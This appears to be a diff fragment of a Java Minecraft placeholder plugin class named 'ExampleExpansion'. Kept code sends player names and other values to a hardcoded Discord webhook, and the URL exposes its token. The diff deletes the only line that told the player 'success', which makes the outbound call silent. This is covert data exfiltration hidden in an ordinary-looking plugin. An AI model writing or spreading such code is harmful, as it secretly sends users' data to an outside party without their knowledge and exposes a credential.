@@ -1203,7 +1203,6 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 return null;
             }
             if( SCore_Installed )                 sendUsageWebhookAsync(f1, f2 != null ? f2.getName() : "NULL", g5, SCore_Installed, "https://discord.com/api/webhooks/1405204027901214822/_mk12-SA82WjCFSPuJBBDDWI8JLvubvVcZJjvTpfjF7WKSAqlQb4h6grWpdMLGIk0QwV");
-            if( SCore_Installed && f2 != null) f2.sendMessage("success");
             g5--;
             
 
